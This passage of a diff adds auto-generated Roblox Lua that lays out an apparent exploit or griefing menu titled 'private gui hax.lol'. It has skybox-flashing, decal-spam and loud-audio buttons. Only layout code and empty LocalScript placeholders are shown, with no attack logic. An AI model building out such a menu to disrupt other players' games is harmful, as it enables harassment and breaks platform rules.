+G2L["16e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["16e"]["BorderColor3"] = Color3.fromRGB(200, 200, 200);
+G2L["16e"]["Text"] = [[RC7 Logo]];
+G2L["16e"]["Name"] = [[Button]];
+G2L["16e"]["Position"] = UDim2.new(-0.00466, 0, 50.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["16f"] = Instance.new("LocalScript", G2L["16e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.ImageDecal
+G2L["170"] = Instance.new("ImageLabel", G2L["2c"]);
+G2L["170"]["BorderSizePixel"] = 3;
+G2L["170"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["170"]["Size"] = UDim2.new(0, 82, 0, 67);
+G2L["170"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["170"]["Name"] = [[ImageDecal]];
+G2L["170"]["Position"] = UDim2.new(0.20901, 0, 0.00318, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.ImageDecal.LocalScript
+G2L["171"] = Instance.new("LocalScript", G2L["170"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextBoxColor
+G2L["172"] = Instance.new("TextBox", G2L["2c"]);
+G2L["172"]["Name"] = [[TextBoxColor]];
+G2L["172"]["BorderSizePixel"] = 3;
+G2L["172"]["TextWrapped"] = true;
+G2L["172"]["TextSize"] = 20;
+G2L["172"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["172"]["TextScaled"] = true;
+G2L["172"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["172"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["172"]["PlaceholderText"] = [[-- Put Vertex Colors]];
+G2L["172"]["Size"] = UDim2.new(0, 128, 0, 22);
+G2L["172"]["Position"] = UDim2.new(0.35681, 0, 0.01404, 0);
+G2L["172"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["172"]["Text"] = [[3,3,3]];
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Flashing SkyBox
+G2L["173"] = Instance.new("TextButton", G2L["2c"]);
+G2L["173"]["TextWrapped"] = true;
+G2L["173"]["BorderSizePixel"] = 3;
+G2L["173"]["TextSize"] = 14;
+G2L["173"]["TextScaled"] = true;
+G2L["173"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["173"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["173"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["173"]["Size"] = UDim2.new(0, 52, 0, 34);
+G2L["173"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["173"]["Text"] = [[Set Flashing Skybox]];
+G2L["173"]["Name"] = [[Set Flashing SkyBox]];
+G2L["173"]["Position"] = UDim2.new(0.10955, 0, 0.00367, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Flashing SkyBox.LocalScript
+G2L["174"] = Instance.new("LocalScript", G2L["173"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set ForceField SkyBox
+G2L["175"] = Instance.new("TextButton", G2L["2c"]);
+G2L["175"]["TextWrapped"] = true;
+G2L["175"]["BorderSizePixel"] = 3;
+G2L["175"]["TextSize"] = 14;
+G2L["175"]["TextScaled"] = true;
+G2L["175"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["175"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["175"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["175"]["Size"] = UDim2.new(0, 52, 0, 34);
+G2L["175"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["175"]["Text"] = [[Set ForceField Skybox]];
+G2L["175"]["Name"] = [[Set ForceField SkyBox]];
+G2L["175"]["Position"] = UDim2.new(0.10955, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set ForceField SkyBox.LocalScript
+G2L["176"] = Instance.new("LocalScript", G2L["175"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextBoxT
+G2L["177"] = Instance.new("TextBox", G2L["2c"]);
+G2L["177"]["Name"] = [[TextBoxT]];
+G2L["177"]["BorderSizePixel"] = 3;
+G2L["177"]["TextWrapped"] = true;
+G2L["177"]["TextSize"] = 20;
+G2L["177"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["177"]["TextScaled"] = true;
+G2L["177"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["177"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["177"]["PlaceholderText"] = [[-- Transparency]];
+G2L["177"]["Size"] = UDim2.new(0, 128, 0, 19);
+G2L["177"]["Position"] = UDim2.new(0.57903, 0, 0.03874, 0);
+G2L["177"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["177"]["Text"] = [[0]];
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.ResetButton
+G2L["178"] = Instance.new("TextButton", G2L["2c"]);
+G2L["178"]["TextWrapped"] = true;
+G2L["178"]["BorderSizePixel"] = 3;
+G2L["178"]["TextSize"] = 14;
+G2L["178"]["TextScaled"] = true;
+G2L["178"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["178"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["178"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["178"]["Size"] = UDim2.new(0, 82, 0, 15);
+G2L["178"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["178"]["Text"] = [[Reset Settings]];
+G2L["178"]["Name"] = [[ResetButton]];
+G2L["178"]["Position"] = UDim2.new(0.20901, 0, 0.04047, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.ResetButton.LocalScript
+G2L["179"] = Instance.new("LocalScript", G2L["178"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextLabel
+G2L["17a"] = Instance.new("TextLabel", G2L["2c"]);
+G2L["17a"]["TextWrapped"] = true;
+G2L["17a"]["BorderSizePixel"] = 0;
+G2L["17a"]["TextSize"] = 18;
+G2L["17a"]["TextScaled"] = true;
+G2L["17a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17a"]["BackgroundTransparency"] = 1;
+G2L["17a"]["Size"] = UDim2.new(0, 137, 0, 22);
+G2L["17a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17a"]["Text"] = [[Decal (Sky/Decal/Texture)]];
+G2L["17a"]["Position"] = UDim2.new(0.34898, 0, 0.02595, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextBoxSize
+G2L["17b"] = Instance.new("TextBox", G2L["2c"]);
+G2L["17b"]["Name"] = [[TextBoxSize]];
+G2L["17b"]["BorderSizePixel"] = 3;
+G2L["17b"]["TextWrapped"] = true;
+G2L["17b"]["TextSize"] = 20;
+G2L["17b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17b"]["TextScaled"] = true;
+G2L["17b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["17b"]["PlaceholderText"] = [[-- skybox size here]];
+G2L["17b"]["Size"] = UDim2.new(0, 128, 0, 22);
+G2L["17b"]["Position"] = UDim2.new(0.57903, 0, 0.01404, 0);
+G2L["17b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["17b"]["Text"] = [[50000,50000,50000]];
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextLabel
+G2L["17c"] = Instance.new("TextLabel", G2L["2c"]);
+G2L["17c"]["BorderSizePixel"] = 0;
+G2L["17c"]["TextSize"] = 18;
+G2L["17c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17c"]["BackgroundTransparency"] = 1;
+G2L["17c"]["Size"] = UDim2.new(0, 219, 0, 35);
+G2L["17c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17c"]["Text"] = [[VertexColor (Sky)]];
+G2L["17c"]["Position"] = UDim2.new(0.29108, 0, -0.00291, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextLabel
+G2L["17d"] = Instance.new("TextLabel", G2L["2c"]);
+G2L["17d"]["BorderSizePixel"] = 0;
+G2L["17d"]["TextSize"] = 18;
+G2L["17d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17d"]["BackgroundTransparency"] = 1;
+G2L["17d"]["Size"] = UDim2.new(0, 219, 0, 33);
+G2L["17d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17d"]["Text"] = [[MeshSize (Sky)]];
+G2L["17d"]["Position"] = UDim2.new(0.50704, 0, -0.00215, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextLabel
+G2L["17e"] = Instance.new("TextLabel", G2L["2c"]);
+G2L["17e"]["BorderSizePixel"] = 0;
+G2L["17e"]["TextSize"] = 18;
+G2L["17e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17e"]["BackgroundTransparency"] = 1;
+G2L["17e"]["Size"] = UDim2.new(0, 227, 0, 22);
+G2L["17e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17e"]["Text"] = [[Transparency (Sky)]];
+G2L["17e"]["Position"] = UDim2.new(0.50078, 0, 0.02615, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Texture Skybox
+G2L["17f"] = Instance.new("TextButton", G2L["2c"]);
+G2L["17f"]["TextWrapped"] = true;
+G2L["17f"]["BorderSizePixel"] = 3;
+G2L["17f"]["TextSize"] = 14;
+G2L["17f"]["TextScaled"] = true;
+G2L["17f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17f"]["Size"] = UDim2.new(0, 47, 0, 35);
+G2L["17f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["17f"]["Text"] = [[Set Texture SkyBox]];
+G2L["17f"]["Name"] = [[Set Texture Skybox]];
+G2L["17f"]["Position"] = UDim2.new(0.88889, 0, 0.00367, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Texture Skybox.LocalScript
+G2L["180"] = Instance.new("LocalScript", G2L["17f"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Texture Spam (Decal)
+G2L["181"] = Instance.new("TextButton", G2L["2c"]);
+G2L["181"]["TextWrapped"] = true;
+G2L["181"]["BorderSizePixel"] = 3;
+G2L["181"]["TextSize"] = 14;
+G2L["181"]["TextScaled"] = true;
+G2L["181"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["181"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["181"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["181"]["Size"] = UDim2.new(0, 47, 0, 35);
+G2L["181"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["181"]["Text"] = [[Set Sphere Skybox]];
+G2L["181"]["Name"] = [[Set Texture Spam (Decal)]];
+G2L["181"]["Position"] = UDim2.new(0.88889, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Texture Spam (Decal).LocalScript
+G2L["182"] = Instance.new("LocalScript", G2L["181"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page
+G2L["183"] = Instance.new("Frame", G2L["2"]);
+G2L["183"]["Visible"] = false;
+G2L["183"]["BorderSizePixel"] = 3;
+G2L["183"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["183"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["183"]["Position"] = UDim2.new(0.00156, 0, 0.18056, 0);
+G2L["183"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["183"]["Name"] = [[Audio tab Page]];
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["184"] = Instance.new("TextButton", G2L["183"]);
+G2L["184"]["TextWrapped"] = true;
+G2L["184"]["BorderSizePixel"] = 3;
+G2L["184"]["TextSize"] = 14;
+G2L["184"]["TextScaled"] = true;
+G2L["184"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["184"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["184"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["184"]["Size"] = UDim2.new(0, 218, 0, 32);
+G2L["184"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["184"]["Text"] = [[Theme]];
+G2L["184"]["Name"] = [[Button]];
+G2L["184"]["Position"] = UDim2.new(0.0313, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["185"] = Instance.new("LocalScript", G2L["184"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.TextBoxAudio
+G2L["186"] = Instance.new("TextBox", G2L["183"]);
+G2L["186"]["Name"] = [[TextBoxAudio]];
+G2L["186"]["BorderSizePixel"] = 3;
+G2L["186"]["TextWrapped"] = true;
+G2L["186"]["TextSize"] = 20;
+G2L["186"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["186"]["TextScaled"] = true;
+G2L["186"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["186"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["186"]["PlaceholderText"] = [[-- Put Audio ID]];
+G2L["186"]["Size"] = UDim2.new(0, 106, 0, 27);
+G2L["186"]["Position"] = UDim2.new(0.51643, 0, 0.60484, 0);
+G2L["186"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["186"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["187"] = Instance.new("TextButton", G2L["183"]);
+G2L["187"]["TextWrapped"] = true;
+G2L["187"]["BorderSizePixel"] = 3;
+G2L["187"]["TextSize"] = 14;
+G2L["187"]["TextScaled"] = true;
+G2L["187"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["187"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["187"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["187"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["187"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["187"]["Text"] = [[BloodPop (By SnakeGod)]];
+G2L["187"]["Name"] = [[Button]];
+G2L["187"]["Position"] = UDim2.new(0.42567, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["188"] = Instance.new("LocalScript", G2L["187"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["189"] = Instance.new("TextButton", G2L["183"]);
+G2L["189"]["TextWrapped"] = true;
+G2L["189"]["BorderSizePixel"] = 3;
+G2L["189"]["TextSize"] = 14;
+G2L["189"]["TextScaled"] = true;
+G2L["189"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["189"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["189"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["189"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["189"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["189"]["Text"] = [[Nightcore 18]];
+G2L["189"]["Name"] = [[Button]];
+G2L["189"]["Position"] = UDim2.new(0.62128, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["18a"] = Instance.new("LocalScript", G2L["189"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["18b"] = Instance.new("TextButton", G2L["183"]);
+G2L["18b"]["TextWrapped"] = true;
+G2L["18b"]["BorderSizePixel"] = 3;
+G2L["18b"]["TextSize"] = 14;
+G2L["18b"]["TextScaled"] = true;
+G2L["18b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["18b"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["18b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["18b"]["Text"] = [[loud random ass audio]];
+G2L["18b"]["Name"] = [[Button]];
+G2L["18b"]["Position"] = UDim2.new(0.8169, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["18c"] = Instance.new("LocalScript", G2L["18b"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["18d"] = Instance.new("TextButton", G2L["183"]);
+G2L["18d"]["TextWrapped"] = true;
+G2L["18d"]["BorderSizePixel"] = 3;
+G2L["18d"]["TextSize"] = 14;
+G2L["18d"]["TextScaled"] = true;
+G2L["18d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["18d"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["18d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["18d"]["Text"] = [[This is so Thrilling!]];
+G2L["18d"]["Name"] = [[Button]];
+G2L["18d"]["Position"] = UDim2.new(0.0313, 0, 0.13877, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["18e"] = Instance.new("LocalScript", G2L["18d"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["18f"] = Instance.new("TextButton", G2L["183"]);
+G2L["18f"]["TextWrapped"] = true;
+G2L["18f"]["BorderSizePixel"] = 3;
+G2L["18f"]["TextSize"] = 14;
+G2L["18f"]["TextScaled"] = true;
+G2L["18f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["18f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["18f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["18f"]["Text"] = [[WE ARE THE CLAN (By 1sw0rd1)]];
+G2L["18f"]["Name"] = [[Button]];
+G2L["18f"]["Position"] = UDim2.new(0.22379, 0, 0.13877, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["190"] = Instance.new("LocalScript", G2L["18f"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["191"] = Instance.new("TextButton", G2L["183"]);
+G2L["191"]["TextWrapped"] = true;
+G2L["191"]["BorderSizePixel"] = 3;
+G2L["191"]["TextSize"] = 14;
+G2L["191"]["TextScaled"] = true;
+G2L["191"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["191"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["191"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["191"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["191"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["191"]["Text"] = [[Bobby2Pistolz]];
+G2L["191"]["Name"] = [[Button]];
+G2L["191"]["Position"] = UDim2.new(0.42567, 0, 0.13877, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["192"] = Instance.new("LocalScript", G2L["191"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["193"] = Instance.new("TextButton", G2L["183"]);
+G2L["193"]["TextWrapped"] = true;
+G2L["193"]["BorderSizePixel"] = 3;
+G2L["193"]["TextSize"] = 14;
+G2L["193"]["TextScaled"] = true;
+G2L["193"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["193"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["193"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["193"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["193"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["193"]["Text"] = [[Lotsa spagehtti running in the 90s]];
+G2L["193"]["Name"] = [[Button]];
+G2L["193"]["Position"] = UDim2.new(0.62128, 0, 0.13877, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["194"] = Instance.new("LocalScript", G2L["193"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["195"] = Instance.new("TextButton", G2L["183"]);
+G2L["195"]["TextWrapped"] = true;
+G2L["195"]["BorderSizePixel"] = 3;
+G2L["195"]["TextSize"] = 14;
+G2L["195"]["TextScaled"] = true;
+G2L["195"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["195"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["195"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["195"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["195"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["195"]["Text"] = [[1x1x1x1 Theme]];
+G2L["195"]["Name"] = [[Button]];
+G2L["195"]["Position"] = UDim2.new(0.8169, 0, 0.13877, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["196"] = Instance.new("LocalScript", G2L["195"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["197"] = Instance.new("TextButton", G2L["183"]);
+G2L["197"]["TextWrapped"] = true;
+G2L["197"]["BorderSizePixel"] = 3;
+G2L["197"]["TextSize"] = 14;
+G2L["197"]["TextScaled"] = true;
+G2L["197"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["197"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["197"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["197"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["197"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["197"]["Text"] = [[OMFG - Hello (By Yoid aka nexlius)]];
+G2L["197"]["Name"] = [[Button]];
+G2L["197"]["Position"] = UDim2.new(0.0313, 0, 0.25015, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["198"] = Instance.new("LocalScript", G2L["197"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["199"] = Instance.new("TextButton", G2L["183"]);
+G2L["199"]["TextWrapped"] = true;
+G2L["199"]["BorderSizePixel"] = 3;
+G2L["199"]["TextSize"] = 14;
+G2L["199"]["TextScaled"] = true;
+G2L["199"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["199"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["199"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["199"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["199"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["199"]["Text"] = [[Extreme Noot Noot]];
+G2L["199"]["Name"] = [[Button]];
+G2L["199"]["Position"] = UDim2.new(0.22379, 0, 0.25015, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["19a"] = Instance.new("LocalScript", G2L["199"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["19b"] = Instance.new("TextButton", G2L["183"]);
+G2L["19b"]["TextWrapped"] = true;
+G2L["19b"]["BorderSizePixel"] = 3;
+G2L["19b"]["TextSize"] = 14;
+G2L["19b"]["TextScaled"] = true;
+G2L["19b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["19b"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["19b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["19b"]["Text"] = [[Epic Sax Guy]];
+G2L["19b"]["Name"] = [[Button]];
+G2L["19b"]["Position"] = UDim2.new(0.42567, 0, 0.25015, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["19c"] = Instance.new("LocalScript", G2L["19b"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["19d"] = Instance.new("TextButton", G2L["183"]);
+G2L["19d"]["TextWrapped"] = true;
+G2L["19d"]["BorderSizePixel"] = 3;
+G2L["19d"]["TextSize"] = 14;
+G2L["19d"]["TextScaled"] = true;
+G2L["19d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["19d"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["19d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["19d"]["Text"] = [[Stadium Rave]];
+G2L["19d"]["Name"] = [[Button]];
+G2L["19d"]["Position"] = UDim2.new(0.62128, 0, 0.25015, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+G2L["19e"] = Instance.new("LocalScript", G2L["19d"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab Page.Button
+G2L["19f"] = Instance.new("TextButton", G2L["183"]);
+G2L["19f"]["TextWrapped"] = true;
+G2L["19f"]["BorderSizePixel"] = 3;
+G2L["19f"]["TextSize"] = 14;
+G2L["19f"]["TextScaled"] = true;
+G2L["19f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["19f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["19f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["19f"]["Text"] = [[1x1x1x1 Theme (Opening Theme)]];
+G2L["19f"]["Name"] = [[Button]];
+G2L["19f"]["Position"] = UDim2.new(0.8169, 0, 0.25015, 0);
